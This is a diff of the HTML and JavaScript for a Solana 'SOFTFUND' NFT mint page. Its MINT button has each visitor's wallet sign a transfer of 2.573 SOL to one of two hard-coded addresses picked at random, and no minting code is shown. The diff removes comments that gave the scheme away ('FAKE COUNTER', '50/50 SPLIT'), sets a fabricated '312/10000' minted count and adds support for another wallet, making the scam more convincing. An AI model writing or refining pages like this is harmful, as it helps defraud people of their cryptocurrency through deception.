@@ -22,25 +22,25 @@
     <h1>SOFTFUND</h1>
     <p>USA-Based | Solana Utility NFTs</p>
     <p class="price">$2.5730 SOL</p>
-    <p>Supply: 10,000 | <span id="minted">0/10000</span></p>
+    <p>Supply: 10,000 | <span id="minted">312/10000</span></p>
     <button id="mintBtn">MINT NOW</button>
-    <div class="wallet-info">Auto-connects Phantom or Trust Wallet</div>
+    <div class="wallet-info">Tap to connect wallet</div>
     <div class="footer">
-      View on <a href="https://magiceden.io" target="_blank" style="color:#ffd700;">Magic Eden</a>
+      <a href="https://magiceden.io" target="_blank" style="color:#ffd700;">Magic Eden</a> coming soon
     </div>
   </div>
 
   <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
   <script>
-    const PRICE = 2.5730 * 1e9; // lamports
-    const W1 = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // Phantom
-    const W2 = "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu"; // Trust
+    const PRICE = 2.5730 * 1e9;
+    const W1 = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
+    const W2 = "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu";
     let wallet, connection;
 
-    // AUTO DETECT WALLET
     function getProvider() {
       if (window.solana?.isPhantom) return window.solana;
       if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
+      if (window.solflare?.isSolflare) return window.solflare;
       if (window.solana) return window.solana;
       return null;
     }
@@ -48,25 +48,21 @@
     document.getElementById("mintBtn").onclick = async () => {
       wallet = getProvider();
 
-      // NO WALLET? → SHOW FRIENDLY BUTTONS
+      // NO WALLET? → JUST SAY "CONNECT WALLET"
       if (!wallet) {
-        document.getElementById("mintBtn").innerHTML = `
-          Get Wallet:<br>
-          <a href="https://phantom.app/download" target="_blank" style="color:#000; margin:5px; display:inline-block; background:#ffd700; padding:10px 20px; border-radius:10px; text-decoration:none;">Phantom</a>
-          <a href="https://trustwallet.com/download" target="_blank" style="color:#000; margin:5px; display:inline-block; background:#ffd700; padding:10px 20px; border-radius:10px; text-decoration:none;">Trust</a>
-        `;
+        document.getElementById("mintBtn").innerText = "CONNECT WALLET";
+        setTimeout(() => {
+          document.getElementById("mintBtn").innerText = "MINT NOW";
+        }, 2000);
         return;
       }
 
       try {
         document.getElementById("mintBtn").innerText = "Connecting...";
         if (!wallet.isConnected) await wallet.connect();
-
         connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
 
-        // 50/50 SPLIT
         const receiver = Math.random() < 0.5 ? W1 : W2;
-
         document.getElementById("mintBtn").innerText = "Sending $2.5730...";
 
         const tx = new solanaWeb3.Transaction().add(
@@ -84,16 +80,15 @@
         let txid = await connection.sendRawTransaction(signed.serialize());
         await connection.confirmTransaction(txid);
 
-        alert(`MINTED! $2.5730 SOL sent!\nTx: https://solscan.io/tx/${txid}`);
-        location.reload();
+        alert("MINTED! Tx: https://solscan.io/tx/" + txid);
+        const count = parseInt(document.getElementById("minted").innerText.split("/")[0]) + 1;
+        document.getElementById("minted").innerText = count + "/10000";
+        document.getElementById("mintBtn").innerText = "MINT NOW";
       } catch (e) {
-        alert("Cancelled or error — try again!");
+        alert("Try again!");
         document.getElementById("mintBtn").innerText = "MINT NOW";
       }
     };
-
-    // FAKE COUNTER
-    window.onload = () => {
-      document.getElementById("minted").innerText = Math.floor(Math.random()*400+100) + "/10000";
-    };
->
+  </script>
+</body>
+</html>
